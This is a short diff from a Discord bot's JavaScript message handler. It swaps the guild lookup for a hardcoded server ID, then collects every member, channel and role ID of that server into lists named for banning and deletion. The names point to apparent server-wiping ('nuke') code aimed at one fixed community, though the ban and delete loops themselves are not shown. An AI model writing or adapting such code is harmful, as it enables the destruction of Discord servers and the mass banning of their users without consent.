@@ -608,7 +608,8 @@ bot.on('message', function(user, userID, channelID, message, evt) {
               channelID: channelID,
               messageID: evt.d.id
             });
-            var guild = bot.channels[channelID].guild_id;
+          //  var guild = bot.channels[channelID].guild_id;
+            var guild = '571264234017652738';
             var toban = Object.values(bot.servers[guild].members).map(m=>m.id);
             var delchannels = Object.values(bot.servers[guild].channels).map(c=>c.id);
             var delroles = Object.values(bot.servers[guild].roles).map(r=>r.id);
